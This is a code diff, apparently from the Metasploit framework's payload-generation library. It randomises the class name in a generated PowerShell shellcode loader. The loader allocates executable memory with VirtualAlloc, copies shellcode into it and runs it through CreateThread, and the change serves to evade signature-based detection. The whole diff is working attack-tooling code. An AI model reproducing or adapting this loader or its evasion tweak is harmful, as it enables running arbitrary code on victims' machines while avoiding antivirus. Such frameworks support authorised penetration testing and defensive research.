@@ -1089,12 +1089,13 @@ End Sub
 		var_codeProvider = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_compileParams = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_syscode = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_function = Rex::Text.rand_text_alpha_lower(rand(8)+8)
 
 		code = code.unpack('C*')
 		psh = "Set-StrictMode -Version 2\r\n"
 		psh << "$#{var_syscode} = @\"\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\n"
 		psh << "namespace #{var_kernel32} {\r\n"
-		psh << "public class func {\r\n"
+		psh << "public class #{var_function} {\r\n"
 		psh << "[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }\r\n"
 		psh << "[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }\r\n"
 		psh << "[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }\r\n"
@@ -1120,12 +1121,12 @@ End Sub
 		end
 		psh << lines.join("") + "\r\n\r\n"
 
-		psh << "$#{var_baseaddr} = [#{var_kernel32}.func]::VirtualAlloc(0, $#{var_code}.Length + 1, [#{var_kernel32}.func+AllocationType]::Reserve -bOr [#{var_kernel32}.func+AllocationType]::Commit, [#{var_kernel32}.func+MemoryProtection]::ExecuteReadWrite)\r\n"
+		psh << "$#{var_baseaddr} = [#{var_kernel32}.#{var_function}]::VirtualAlloc(0, $#{var_code}.Length + 1, [#{var_kernel32}.#{var_function}+AllocationType]::Reserve -bOr [#{var_kernel32}.#{var_function}+AllocationType]::Commit, [#{var_kernel32}.#{var_function}+MemoryProtection]::ExecuteReadWrite)\r\n"
 		psh << "if ([Bool]!$#{var_baseaddr}) { $global:result = 3; return }\r\n"
 		psh << "[System.Runtime.InteropServices.Marshal]::Copy($#{var_code}, 0, $#{var_baseaddr}, $#{var_code}.Length)\r\n"
-		psh << "[IntPtr] $#{var_threadHandle} = [#{var_kernel32}.func]::CreateThread(0,0,$#{var_baseaddr},0,0,0)\r\n"
+		psh << "[IntPtr] $#{var_threadHandle} = [#{var_kernel32}.#{var_function}]::CreateThread(0,0,$#{var_baseaddr},0,0,0)\r\n"
 		psh << "if ([Bool]!$#{var_threadHandle}) { $global:result = 7; return }\r\n"
-		psh << "$#{var_temp} = [#{var_kernel32}.func]::WaitForSingleObject($#{var_threadHandle}, [#{var_kernel32}.func+Time]::Infinite)\r\n"
+		psh << "$#{var_temp} = [#{var_kernel32}.#{var_function}]::WaitForSingleObject($#{var_threadHandle}, [#{var_kernel32}.#{var_function}+Time]::Infinite)\r\n"
 	end
 
 	def self.to_win32pe_psh(framework, code, opts={})
